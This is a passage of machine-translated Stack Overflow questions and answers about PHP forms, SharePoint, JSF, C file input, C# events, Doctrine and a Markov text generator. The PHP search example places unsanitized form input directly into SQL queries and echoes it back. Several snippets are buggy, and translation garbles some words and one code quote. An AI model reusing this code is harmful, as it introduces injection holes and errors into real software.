      //Assign the properties
    }

    public function render()
    {
        $html .= '<option value="' . $this->value . '"';
        if ($this->isSelected)
        {
         $html .= ' selected="selected" ';
        }
       $html .= '>' . $this->label . "</option>\n";
    }
} 
```

我喜欢以这种方式建模的一件事是添加新功能（例如选定/未选定项目的 CSS 样式或禁用属性）非常容易，因为您知道新功能属于哪个对象。此外，拥有这种“小”对象可以很容易地编写单元测试。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T06:30:40.943

您还可以添加选定的选项功能

> 公共静态函数 viewSelect($name = "select", $arr_options = array(), $selected) {
> 
> ```
> $selectedhtml = "";
> $html = "<select name='$name'>\n";
> foreach ($arr_options as $key => $val) {
> 
> if($key == $selected) $selectedhtml = "selected";
> 
>     $html .= "<option value='$key' $selectedhtml>$val</option>\n";
> }
> $html .= "</select>\n";
> return $html; } 
> ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T17:50:15.823

只需通过迭代传递给该方法的关联数组来创建一个返回 HTML 选择/选项视图的方法...？可能是这样的：

```
public static function viewSelect($name = "select", $arr_options = array()) {
    $html = "<select name='$name'>\n";
    foreach ($arr_options as $key => $val) {
        $html .= "<option value='$key'>$val</option>\n";
    }
    $html .= "</select>\n";
    return $html;
} 
```

然后只需将其中一个数据库查询的结果传递给此方法。您可以将此方法放入您想要的任何适当的类中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-28T16:48:01.267

```
public function get_posts()
{
    $query="select * from tbl_posts";
    $result=  mysql_query($query);
    $i=0;
    while($data=  mysql_fetch_assoc($result))
    {
        foreach($data as $key=>$value)
        {
            $info[$i][$key]=$value;
        }
        $i++;
    }
    return $info;

} 
```

# php - file_exists 不适用于文件服务器中存在的文件

> ID：13221085
> 
> 赞同：1
> 
> 时间：2012-11-04T17:35:44.030
> 
> 标签：php, windows-7, file-io, fileserver

我面临一个问题，即我能够链接到 http 服务器或 ftp 服务器中存在的文件..但我无法链接到文件服务器中存在的文件..

即，更清楚.. 如果 URL 是`http://serverpath.com/images/image.jpg`或`ftp://serverpath.com/images/image.jpg`远程路径，则`file_exists`函数给出一个`true`值，但如果给出一个文件服务器路径，就像函数给出一个值的类似路径`//serverpath/public/images/image.jpg`一样。`file_exists``false`

**更新**

我正在使用 PHP 5.4.4

在以前的php版本（即5.3以下）中报告了一个关于此问题的错误，并被告知此问题已在5.3以上的版本中解决。php.ini 中是否有任何更改需要我们进行更改才能启用。我搜索但没有得到我期望的答案

请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:46:49.863

使用卷曲：

```
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http:\\www.somesite.com\somefile.html'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
$data = curl_exec($ch);
curl_close($ch); 
```

curl_exec($ch) 如果没有文件或成功的实际数据将返回 FALSE

然而：

你最好将你的共享文件夹绑定到一个逻辑硬盘上

```
net use E: \\servername\shareddirectory 
```

这样做将允许您访问远程文件，就像它在本地磁盘上一样（比如 E:）。

如果您提供“本地”路径 E:\filepath\filename，file_exists() 应该可以工作

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T17:48:44.657

你的 php.ini allow_url_fopen 开启了吗？

# sharepoint - Sharepoint 2010 创建子站点时如何激活功能

> ID：13221086
> 
> 赞同：1
> 
> 时间：2012-11-04T17:35:48.513
> 
> 标签：sharepoint, sharepoint-2010

我在 Visual Studio 中创建了一个 Web 模板，用户可以从中创建子站点。我想在创建子站点时激活一项功能，例如创建列表项等。

我将如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T17:46:40.987

您可以将功能与特定网站模板相关联，但如果您输入“GLOBAL”而不是模板名称，您的功能将为[*所有*创建的网站](http://msdn.microsoft.com/en-us/library/aa544294.aspx)激活。

```
<Elements xmlns="http://schemas.microsoft.com/sharepoint/">
  <FeatureSiteTemplateAssociation Id="29D85C25-170C-4df9-A641-12DB0B9D4130" TemplateName="GLOBAL" />
</Elements> 
```

# jsf - Primefaces selectOneRadio ajax

> ID：13221089
> 
> 赞同：18
> 
> 时间：2012-11-04T17:36:08.313
> 
> 标签：jsf, jsf-2, primefaces, selectoneradio

每次用户单击单选按钮时，我都会尝试显示验证消息。

这仅在我单击提交按钮时有效，但在我单击单选按钮时无效：

```
 <h:form id="form">
        <p:panel id="panel">
            <ui:repeat value="#{questionsBean}" var="question">
                <h:panelGrid columns="3" style="margin-bottom:10px" cellpadding="5">
                    <h:outputText value="#{question.questionText}" />
                    <p:selectOneRadio id="question" value="#{question.response}"
                        validator="#{question.validate}" required="true">
                        <f:selectItem itemLabel="Yes" itemValue="Yes" />
                        <f:selectItem itemLabel="No" itemValue="No" />
                        <p:ajax update="msgQuestion" event="change"/>
                    </p:selectOneRadio>
                    <p:message for="question" id="msgQuestion" />
                </h:panelGrid>
            </ui:repeat>
            <p:commandButton id="btn" value="Save" update="panel" partialSubmit="true"/>
        </p:panel>
    </h:form> 
```

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-11-05T00:36:16.107

`change`当您想监听单选按钮（或复选框）是否被单击时，HTML DOM事件是错误的事件。您应该为此使用该`click`事件。

单选按钮（和复选框）的值基本上不会改变。它始终具有相同的值。问题更多的是该值是否会发送到服务器端。这由通常由 DOM`click`事件触发的“已检查”状态决定。

单选按钮/复选框上事件的实际行为`change`取决于所使用的网络浏览器。该行为在 IE 浏览器中特别不一致。它不仅取决于使用的版本，还取决于使用的渲染模式（怪癖模式与标准模式）。也许您在测试时实际上正在使用 IE。

`event`PrimeFaces `<p:ajax>`（和标准 JSF `<f:ajax>`）的默认类型`valueChange`已经自动涵盖了这一点：

```
<p:ajax update="msgQuestion" event="valueChange" /> 
```

这将`change`在文本输入和下拉菜单中自动生成正确的事件处理程序，并`click`在单选按钮和复选框中自动生成事件处理程序。

但如前所述，它已经是*默认* `event`类型。完全省略它。

```
<p:ajax update="msgQuestion" /> 
```

# php - 奇怪的空查询错误

> ID：13221091
> 
> 赞同：0
> 
> 时间：2012-11-04T17:36:34.657
> 
> 标签：php

我不断收到这个简单脚本的空查询错误。有任何想法吗？

我只有一个带有输入框和按钮的表单，在表单之外我有一个名为 filter1 的下拉列表，其中包含 3 个值“整个站点”、“页面”、“博客”。

```
<?php

//process the search query

if (isset($_POST['submitted'])) {

    require('db_conn.php'); // connect to db

    $search_query = $_POST['searchquery'];

    // check filter
    if ($_POST['filter1'] == 'Whole Site') {

        $q = "(SELECT id, page_title AS title FROM pages WHERE page_title LIKE '%$searchquery%' OR page_body LIKE '%$searchquery%') UNION (SELECT id, blog_title AS title FROM blog WHERE blog_title LIKE '%$searchquery%' OR blog_body LIKE '%$searchquery%')";

    }
    else if ($_POST['filter1'] == 'Pages') {

        $q = "SELECT id, page_title AS title FROM pages WHERE page_title LIKE '%$searchquery%' OR page_body LIKE '%$searchquery%'";

    }
    else if ($_POST['filter1'] == 'Blog') {

        $q = "SELECT id, blog_title AS title FROM blog WHERE blog_title LIKE '%$searchquery%' OR blog_body LIKE '%$searchquery%'";

    }

    $r = mysqli_query($dbc, $q); // query the db

    $count = mysqli_num_rows($r);

    if ($count > 1) {

        $search_output = 'ok';

    }
    else {

        $search_output = "<hr />0 results for <strong>$search_query</strong><hr />$q";

    }

}

?>

<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <title></title>

</head>

<body>
<h2>Search the tables</h2>

<form action="search.php" method="post">
    <p>Search: <input type="text" name="searchquery"/></p>

    <p><input type="submit" name="submit" value="Search"/></p>
    <input type="hidden" name="submitted" value="TRUE"/>
</form>

<br/>
Search in:
<select name="filter1">
    <option value="Whole Site">Whole site</option>
    <option value="Pages">Pages</option>
    <option value="BLog">Blog</option>
</select>

<?php echo $search_output; ?>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T17:41:04.437

问题是您的表单关闭得太早了。命名的 SELECT`filter1`未包含在您的表单中。

用这种方式重写你的表单：

```
<form action="search.php" method="post">
    <p>Search: <input type="text" name="searchquery"/></p>

    <p><input type="submit" name="submit" value="Search"/></p>
    <input type="hidden" name="submitted" value="TRUE"/>

<br/>
Search in:
<select name="filter1">
    <option value="Whole Site">Whole site</option>
    <option value="Pages">Pages</option>
    <option value="BLog">Blog</option>
</select>
</form> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:28:49.823

我认为它更好，当你使用开关时

```
switch ($_POST['filter1']) {
      case 'Whole Site': $q = "(SELECT id, page_title AS title FROM pages WHERE page_title LIKE '%$searchquery%' OR page_body LIKE '%$searchquery%') UNION (SELECT id, blog_title AS title FROM blog WHERE blog_title LIKE '%$searchquery%' OR blog_body LIKE '%$searchquery%')";
      case 'Pages': $q = "SELECT id, page_title AS title FROM pages WHERE page_title LIKE '%$searchquery%' OR page_body LIKE '%$searchquery%'";
      case 'Blog': $q = "SELECT id, blog_title AS title FROM blog WHERE blog_title LIKE '%$searchquery%' OR blog_body LIKE '%$searchquery%'";
      default: $q = false;
   }
if($q) {

 //Your code
} 
```

# arm - 如何进行 64 位除以 32 位？

> ID：13221093
> 
> 赞同：-3
> 
> 时间：2012-11-04T17:36:57.343
> 
> 标签：arm

我将 IAR 与 STM32 一起使用，我需要 64 位算术。如何为 64 位算术实现 32 位数组？

例如，我有一个 64 位值`0x3B5456DF32`存储在 32 位数组中

```
A[0]= 0x3B
A[1] = 0x5456DF32 
```

我必须把它除以`B = 0x3216523`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-11T04:30:35.700

以前有很多这样的问题。在提问之前，请先搜索并寻找最适合您的答案

*   [64 位除以 32 位除法](https://stackoverflow.com/q/3472117/995714)
*   [有符号 64 x 32 整数除法](https://stackoverflow.com/q/1089265/995714)
*   [64位除法](https://stackoverflow.com/a/366286/995714)
*   [具有 32/16 位除法的处理器上的 64/32 位除法](https://stackoverflow.com/a/4772398/995714)
*   [ARM / NEON的64位/ 32位划分更快的算法？](https://stackoverflow.com/q/15215196/995714)
*   [如何在 ARM 上进行整数（有符号或无符号）除法？](https://stackoverflow.com/q/8348030/995714)

# android - 绘制透明位图

> ID：13221096
> 
> 赞同：0
> 
> 时间：2012-11-04T17:37:08.713
> 
> 标签：android, bitmap, android-canvas, ondraw

在过去的 2-3 天里，我一直面临着一个奇怪的问题。我想做的事情看起来很容易，但我的解决方案并没有以我想要的方式响应。让我告诉你我当然想要什么。

我有一张图片（.png）。我将它分成 5 个部分并将它们保存为 .png。我的期望是有一个视图对象将这 5 张图片显示为图片。所以我决定使用 canvas.drawBitmap() 方法在 onDraw() 方法中绘制这 5 张图片。它工作正常。但是，当我想调整它的大小时，我使用了 createScaledBitmap(bitmap, width, height, boolean)。我已将这种方式应用于每 5 个不同的位图对象，以在 onDraw() 方法中调整大小和绘制。不幸的是，我有一张完整的照片，但每张照片之间都有一条垂直线。我在 createScaledBitmap(bitmap, width, height, boolean) 方法中将布尔值更改为 true，然后它在图片质量不佳的情况下运行良好。

```
protected void onDraw(Canvas canvas) {
    super.onDraw(canvas);

    for (int i = 0; i < 5; i++) {
        Bitmap image = BitmapFactory.decodeResource(getResources(),
                getResources().getIdentifier(
                        "f" + i, "drawable", getContext().getPackageName()));
        image = Bitmap.createScaledBitmap(image, getWidth(), getHeight(), true);
        canvas.drawBitmap(image, new Matrix(), null);
    }
} 
```

[http://imageshack.us/photo/my-images/717/96553428.png](http://imageshack.us/photo/my-images/717/96553428.png)

[http://imageshack.us/photo/my-images/809/33612864.png](http://imageshack.us/photo/my-images/809/33612864.png)

[http://imageshack.us/photo/my-images/255/53597408.png](http://imageshack.us/photo/my-images/255/53597408.png)

注意：绘图速度很重要。这意味着绘制时间应该少于 500 毫秒。

# java - EMF 中 volatile 属性的通知

> ID：13221097
> 
> 赞同：3
> 
> 时间：2012-11-04T17:37:15.850
> 
> 标签：java, volatile, transient, emf, ecore

在具有声明为瞬态和易失性的属性的 Ecore 模型中（其值是从其他几个字段计算得出的），是否有一种规范的方法来生成此字段更改的通知（即，当瞬态易失性字段中的一个字段取决于更改，检查瞬态字段的值是否受此更改影响并发送通知）？

我目前这样做的方法是在瞬态属性的所有者上注册一个侦听器，该属性对依赖项的更改做出反应并在计算的值发生更改时触发通知，但这是我想要的很多繁琐的手动工作避免。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T09:37:49.030

您将知道 EMF 带有自己的适配器。添加适配器实际上并不是那么乏味的工作，我建议在您的情况下这可能是最好的选择（事实上，生成模型代码将包括这些适配器，请参阅[这篇关于每个开发人员应该知道的博客文章关于 EMF](http://eclipsesource.com/blogs/2011/03/22/what-every-eclipse-developer-should-know-about-emf-part-1/)）。

如果您想手动添加此类通知功能，您可以简单地将一个附加`EContentAdapter`到模型的根元素，它将监听整个元素树中的变化。这样您就可以避免向每个模型类添加适配器。

Lars Vogel有一个简单[的](http://www.vogella.com/articles/EclipseEMFNotification/article.html)[教程`Adapter``EContentAdapter`](http://www.vogella.com/articles/EclipseEMFNotification/article.html)。

# asp.net-mvc - 如何防止 MVC ActionFilterAttribute 被缓存？

> ID：13221102
> 
> 赞同：2
> 
> 时间：2012-11-04T17:38:21.277
> 
> 标签：asp.net-mvc, asp.net-mvc-4

我有一个使用实体框架进行权限检查的 MVC API ActionFilterAttribute。我发现由于 ActionFilterAttribute 缓存 EF 连接经常被破坏。[您可以在此处](https://stackoverflow.com/questions/5335350/unitofwork-in-action-filter-seems-to-be-caching)找到其他问题。那么有谁知道如何防止 ActionFilterAttributes 中的缓存？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T18:09:34.650

*只是对您的标题的说明*：我会说 MVC 中的动作过滤器没有被缓存，它们充当单例（如您提供的链接中所述）。

作为对您需求的回答，我会说使用基于请求的持久性。因为你很可能想做一些事情，比如： - OnActionExecuting() （例如打开事务） - OnActionExecuted() （提交或回滚）

所以把你的对象（_unitOfWork）放入

```
System.Web.HttpContext.Current.Items 
```

您可以通过单例方法访问它，同时对请求相关的对象进行操作。我用 NHibernate Session 做类似的事情

# asp.net-mvc - 使用linq从asp.net mvc中的两个日期时间以小时为单位查找时间

> ID：13221104
> 
> 赞同：0
> 
> 时间：2012-11-04T17:38:44.583
> 
> 标签：asp.net-mvc

我正在处理时间表模块。我的问题是我有以下字段的表格

```
work_start_time  Datetime
work_end_time    Datetime
and other field 
```

现在我的要求是我必须计算迄今为止提交的总小时数。

字段保存为这种格式`dd/mm/yy 10:00 AM`

请任何人帮助我如何使用 LINQ 从以上两个字段中找到总小时数和总小时数。

任何帮助，将不胜感激。

```
int totalhours = (from d in db.timesheetWorkingHours
                             .Where(d=>d.WStartTime.HasValue && d.WEndTime.HasValue)
                             select (d.WStartTime - d.WEndTime).Hours).FirstOrDefault();

its gives error 

'System.Nullable<System.TimeSpan>' does not contain a definition for 'Hours' and no extension method 'Hours' accepting a first argument of type 'System.Nullable<System.TimeSpan>' could be found (are you missing a using directive or an assembly reference?) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T07:00:08.427

这是伪代码。这可能会有所帮助。在您的场景时间表对象中，您将从数据库中获取。

```
IList<Timesheet> timesheets = new List<Timesheet>();
            timesheets.Add(new Timesheet
            {
                work_start_time = new DateTime(2012, 11, 5, 10, 0, 0),
                work_end_time = new DateTime(2012, 11, 5, 19, 0, 0)
            });
            timesheets.Add(new Timesheet
            {
                work_start_time = new DateTime(2012, 11, 5, 10, 0, 0),
                work_end_time = new DateTime(2012, 11, 5, 19, 0, 0)
            });
            int totalhours = 0;
            timesheets.ToList().ForEach(
                p => { TimeSpan ts = p.work_end_time - p.work_start_time; totalhours += ts.Hours; }
            );

            Console.WriteLine(totalhours.ToString());

            Console.ReadKey(); 
```

# c - 读取10行整数的文件，将它们放入数组中，并输出数组

> ID：13221106
> 
> 赞同：1
> 
> 时间：2012-11-04T17:39:07.357
> 
> 标签：c

1.  在这个程序中，我想让用户输入 2 个参数，整数个数和文件名。

    1.  该文件有 10 行整数值。
    2.  读取文件，并将其放入 inArray[];
    3.  然后将其作为结尾输出；

        笔记：对于完整的程序，我想制作一个程序，它将扫描由随机整数组成的文件，然后按升序对它们进行排序，并打印出排序整数的前 10%。

        错误：现在，我想测试它是否可以读取文件并将值正确放入 inArray，但它不断出错。

        ```
         warning: initialization makes integer from pointer without a cast
           findTotal.c:43:6: warning: passing argument 1 of ‘fopen’
                       makes pointer from integer without a cast
          /usr/include/stdio.h:271:14: note: expected ‘const 
           char * __restrict__’ but argument is of type ‘char’ 
        ```

请帮我解决这个问题，谢谢

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

 int numOfInt;
 char fileName="";

 sscanf(argv[1],"%d",&numOfInt);
 sscanf(argv[2],"%c",&fileName);

 int i, rc;

 /* the origninal list , initialise as 0 index*/
 int inArray[numOfInt];

 /* the number of output int  */
 int outNumInt = numOfInt * 0.1;

 /*  the output array of int  */
 int outArray[outNumInt];

 FILE *inFile;
 inFile = fopen(fileName,"r");

 /*      check if the file is empty      */
 if(inFile==NULL){
    printf("can not open the file");
 }

 for (i = 0; (rc = getc(inFile)) != EOF && i < numOfInt; inArray[i++] = rc) 
 { 

 }//for

 fclose(inFile);

 for(i = 0; i < numOfInt;i++){

    printf("%x\n",inArray[i]);
 }

}//main 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:50:57.247

我认为您可以在这里更好地使用 scanf 。您使用它来读取应该作为参数传递给程序的两条信息，然后避免将它用于它实际上有益的用途，即读取有问题的文件。这是我对此的看法：

```
#include <stdlib.h>
#include <stdio.h>
int cmp(const void *a, const void *b) { return *(int*)b - *(int*)a; }

int main(int argc, char *argv[])
{
    char * ifile = argv[1];
    int n = atoi(argv[2]), m = n/10, i;
    int nums[n];
    FILE * f = fopen(ifile, "r");
    for(i = 0; i < n; i++) fscanf(f, "%d", &nums[i]);
    qsort(nums, n, sizeof(int), cmp);
    for(i = 0; i < m; i++) printf("%d\n",nums[i]);
    return 0;
} 
```

如果此文件是`prog.c`并且对应的可执行文件是`prog`，并且您的带有数字的文件被称为`nums.txt`，并且包含`100`整数，则可以将其称为

```
prog nums.txt 100 
```

以这种方式接收参数的优点是它使以后重复命令变得更容易（重复它所需的所有信息都将在 shell 的命令历史记录中），并且它是将参数传递给程序的标准方式。它还为其他用途释放标准输入。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:45:20.257

我在您的代码中看到的问题之一是：

```
 char fileName="";
 sscanf(argv[2],"%c",&fileName) 
```

字符串文字是一个*常量*字符串，这意味着您不应该尝试修改它，您应该为该字符串使用静态（或动态）char 数组并使用`%s`格式说明符，或者只是将 fileName 指向 argv[2]

```
char *fileName;    
fileName = argv[2]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T17:45:34.563

您确实对文件名的管理有问题。`char`用于字符；如果要处理文件名，则必须使用字符串。`char`在 C 语言中，我们可以使用一个以空字符结尾的 数组。在这里，由于`argv[2]`直接保存名称，您可以简单地使用指针。

```
char *fileName = argv[2]; 
```

接着：

```
fopen(fileName, "r"); 
```

由于您不修改`argv`指针，因此您也可以直接`argv[2]`作为参数发送。

# c# - 尝试触发事件时出现 NullReferenceException

> ID：13221115
> 
> 赞同：3
> 
> 时间：2012-11-04T17:40:48.040
> 
> 标签：c#, multithreading, events

我正在学习创建事件和创建多线程应用程序。

该方法`Thread`由另一个类调用，该类使用搜索条件填充参数。A`BackgroundWorker`被创建，执行搜索并将结果返回到`worker_RunWorkerCompleted`。

在 内`worker_RunWorkerCompleted`，我想将结果发送回订阅该`Fireendofsearch`事件的 UI。

我无法理解为什么下面的代码会引发以下错误

> 你调用的对象是空的。

当我触发事件时`Fireendofsearch`

```
public class BackgroundSearch
{
    public event SearchResultCompleteThreaded Fireendofsearch;
    public EventArgs a = null;
    public delegate void SearchResultCompleteThreaded(object seachresults, EventArgs a);
    internal void Thread(string folder, string parms)
    {
        var Argument = new List<object> { folder, parms };
        var worker = new BackgroundWorker {WorkerReportsProgress = false, WorkerSupportsCancellation = false};
        worker.DoWork += worker_DoWork;          
        worker.RunWorkerCompleted += worker_RunWorkerCompleted;
        worker.RunWorkerAsync(Argument);
    }
    void worker_DoWork(object sender, DoWorkEventArgs e)
    {
        var passedAugue = e.Argument as List<object>;
        var returnResult = new List<string[]>();
        if (passedAugue != null)
        {
            var result = Directory.GetFiles(passedAugue[0].ToString(), passedAugue[1].ToString(), SearchOption.AllDirectories);
            foreach (string s in result)
            {
                var t = new string[4];
                t[0] = s;
                t[1] = File.GetCreationTime(s).ToString();
                t[2] = File.GetLastAccessTime(s).ToString();
                t[3] = File.GetLastWriteTime(s).ToString();
                returnResult.Add(t);
            }
        }
        if (returnResult.Count != 0)
        {
            e.Result = returnResult;
        }            
    }
    void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
        if (e.Result != null)
        {
            Fireendofsearch(e.Result, a);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T17:54:33.613

Firendofsearch 将是空的，直到有人订阅它，将您的工作完成事件处理程序更改为此来修复它。

```
void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
{
    if (e.Result != null)
    {
        var friendOfSearch = Fireendofsearch;
        if(friendOfSearch != null)
           friendOfSearch (e.Result, a);
    }
} 
```

我将它复制到变量的原因是，如果另一个线程中的某个人是最后一个在 null 检查和引发事件之间取消订阅的人，您仍然会得到 null 引用异常，通过首先处理另一个变量可以解决该问题。

* * *

但是，如果我在哪里编写它，我会进行一些其他更改，您`EventArgs`出于某种原因重新调整 null 并将结果作为传统事件模式中的“发送者”传递回。我会将您的代码更改为此

```
public event EventHandler<FriendOfSearchArgs> FirendsOfSearch;

void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
{
    if (e.Result != null)
    {
        RaiseFriendOfSearch(e.Result);
    }
}

protected virtual void RaiseFriendOfSearch(object result)
{
    var friendOfSearch = FirendsOfSearch;
    if(friendOfSearch != null)
        friendOfSearch(this, new FriendOfSearchArgs(result));
}

public class FriendOfSearchArgs : EventArgs
{
   public FriendOfSearchArgs(object result)
   {
       Result = result;
   }

   public object Result {get; private set;}
} 
```

这一切都写在 SO 文本框中，因此可能存在一两个错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T17:54:45.153

出于某种原因（很可能是优化），一个事件仅在第一个处理程序方法订阅它时才被实例化。

您必须在代码中检查这一点。

以下是我通常声明事件的方式：

```
public event SearchResultCompleteThreaded Fireendofsearch;

private void RaiseFireEndOfSearchEvent(EventArgs e)
{
    if (Fireendofsearch != null)
    {
       Fireendofsearch(this, e);
    }
} 
```

每当我需要引发事件时，我都会调用辅助方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:01:03.603

在尝试调用委托之前，您应该检查 null。而且您必须首先将其拉入一个单独的变量中以避免线程问题。

```
var ev = Fireendofsearch;
if ( ev != null ) ev( ... ); 
```

我还发现在这种情况下使用扩展方法很有用：

```
public static void Raise ( this EventHandler h, object sender )
{
    if ( h != null) h( sender, EventArgs.Empty );
} 
```

接着：

```
MyEvent.Raise ( this ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T18:29:46.047

在您的公共事件“背后”，有一个类型为 的隐式私有变量`SearchResultCompleteThreaded`。该类型`SearchResultCompleteThreaded`是委托类型。

在 .NET 中，所有代表都是**“多播”代表**。这意味着他们有一个调用**列表**（您的`GetInvocationList()`方法 on`SearchResultCompleteThreaded`派生自[`System.Delegate.GetInvocationList()`](http://msdn.microsoft.com/en-us/library/system.delegate.getinvocationlist.aspx).

现在，在 .NET 中，调用列表保证包含**一个**或多个项目（**不是**零个或多个）。任何委托类型都是不可变类型。但是，如果您尝试通过“减去”现有实例的调用列表中的所有成员来创建新实例，例如`var newDel = oldDel - oldDel;`or `reuseDel -= reuseDel;`，那么您将获得一个空引用，而不是获得一个具有零长度调用列表的新实例！

这样做的好处是您不必担心“空”委托实例（否则可能会被允许）和空引用之间的细微差别。关于它的坏处是你上面的问题。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-04T17:47:09.383

放：

```
public event SearchResultCompleteThreaded Fireendofsearch =  delegate { }; 
```

可能需要初始化吗？

# symfony - symfony2 学说：模式，删除实体和表

> ID：13221120
> 
> 赞同：0
> 
> 时间：2012-11-04T17:41:06.493
> 
> 标签：symfony, doctrine, database-schema

我已经使用以下实体从实体生成了一些表：

```
 php app/console generate:doctrine:entity 

   php app/console doctrine:schema:update --dump-sql

   php app/console doctrine:schema:update --force 
```

我在哪里可以找到生成的模式文件，描述所有已生成的表和字段？删除实体和表的最佳程序是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:10:30.997

`php app/console doctrine:schema:update --dump-sql`转储在命令提示符下生成和执行的 sql，没有使用此命令生成的文件（据我所知）。

数据库中的 Doctrine 表应该被视为对象的集合，如果要删除该表，请删除保存数据的实体并使用命令`php app/console doctrine:schema:update --force`。

如果要更改表中的字段，请更改保存数据的实体类中的字段并再次使用`php app/console doctrine:schema:update --force`

# c - 马尔可夫清洁功能故障

> ID：13221127
> 
> 赞同：2
> 
> 时间：2012-11-04T17:42:07.520
> 
> 标签：c, pointers, free, markov-chains

我正在尝试编写一个函数来清理此代码生成的哈希表

```
/*
* Markov chain random text generator.
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include "eprintf.h"

enum {
NPREF   = 2,    /* number of prefix words */
NHASH   = 4093, /* size of state hash table array */
MAXGEN  = 10000 /* maximum words generated */
};

typedef struct State State;
typedef struct Suffix Suffix;

struct State {  /* prefix + suffix list */
char*   pref[NPREF];    /* prefix words */
Suffix* suf;            /* list of suffixes */
State*  next;           /* next in hash table */
};

struct Suffix { /* list of suffixes */
char*   word;           /* suffix */
Suffix* next;           /* next in list of suffixes */
};

State* lookup(char *prefix[], int create);
void build(char *prefix[], FILE*);
void generate(int nwords);
void add(char *prefix[], char *word);

State* statetab[NHASH]; /* hash table of states */

char NONWORD[] = "\n";  /* cannot appear as real word */

/* markov main: markov-chain random text generation */
int main(void)
{
int i, nwords = MAXGEN;
char *prefix[NPREF];        /* current input prefix */

int c;
long seed;

setProgName("markov");
seed = time(NULL);

srand(seed);
for (i = 0; i < NPREF; i++) /* set up initial prefix */
    prefix[i] = NONWORD;
build(prefix, stdin);
add(prefix, NONWORD);
generate(nwords);
return 0;
}

const int MULTIPLIER = 31;  /* for hash() */

/* hash: compute hash value for array of NPREF strings */
unsigned int hash(char* s[NPREF])
{
unsigned int h;
unsigned char *p;
int i;

h = 0;
for (i = 0; i < NPREF; i++)
    for (p = (unsigned char *) s[i]; *p != '\0'; p++)
        h = MULTIPLIER * h + *p;
return h % NHASH;
}

/* lookup: search for prefix; create if requested. */
/*  returns pointer if present or created; NULL if not. */
/*  creation doesn't strdup so strings mustn't change later. */
State* lookup(char *prefix[NPREF], int create)
{
int i, h;
State *sp;

h = hash(prefix);
for (sp = statetab[h]; sp != NULL; sp = sp->next) {
    for (i = 0; i < NPREF; i++)
        if (strcmp(prefix[i], sp->pref[i]) != 0)
            break;
    if (i == NPREF)     /* found it */
        return sp;
}
if (create) {
    sp = (State *) emalloc(sizeof(State));
    for (i = 0; i < NPREF; i++)
        sp->pref[i] = prefix[i];
    sp->suf = NULL;
    sp->next = statetab[h];
    statetab[h] = sp;
}
return sp;
}

/* addsuffix: add to state. suffix must not change later */
void addsuffix(State *sp, char *suffix)
{
Suffix *suf;

suf = (Suffix *) emalloc(sizeof(Suffix));
suf->word = suffix;
suf->next = sp->suf;
sp->suf = suf;
}

/* add: add word to suffix list, update prefix */
void add(char *prefix[NPREF], char *suffix)
{
State *sp;

sp = lookup(prefix, 1);  /* create if not found */
addsuffix(sp, suffix);
/* move the words down the prefix */
memmove(prefix, prefix+1, (NPREF-1)*sizeof(prefix[0]));
prefix[NPREF-1] = suffix;
}

/* build: read input, build prefix table */
void build(char *prefix[NPREF], FILE *f)
{
char buf[100], fmt[10];

/* create a format string; %s could overflow buf */
sprintf(fmt, "%%%ds", sizeof(buf)-1);
while (fscanf(f, fmt, buf) != EOF)
    add(prefix, estrdup(buf));
}

/* generate: produce output, one word per line */
void generate(int nwords)
{
State *sp;
Suffix *suf;
char *prefix[NPREF], *w;
int i, nmatch;

for (i = 0; i < NPREF; i++) /* reset initial prefix */
    prefix[i] = NONWORD;

for (i = 0; i < nwords; i++) {
    sp = lookup(prefix, 0);
    if (sp == NULL)
        eprintf("internal error: lookup failed");
    nmatch = 0;
    for (suf = sp->suf; suf != NULL; suf = suf->next)
        if (rand() % ++nmatch == 0) /* prob = 1/nmatch */
            w = suf->word;
    if (nmatch == 0)
        eprintf("internal error: no suffix %d %s", i, prefix[0]);
    if (strcmp(w, NONWORD) == 0)
        break;
    printf("%s\n", w);
    memmove(prefix, prefix+1, (NPREF-1)*sizeof(prefix[0]));
    prefix[NPREF-1] = w;
}
} 
```

这是我到目前为止的清洁功能

```
/*Clean Function*/
void clean_up(State *sp)
{
State *temp;
Suffix *temp2, temp3;

for(int h = 0; h < NHASH; h++)
{
    for (sp = statetab[h]; sp != NULL; sp = sp->next)
    {
        while(sp->suf != NULL) 
        {
            temp2= sp->suf;
            temp3= *temp2->next;
            free(temp2);
            sp->suf= &temp3;
        }

    }
}
} 
```

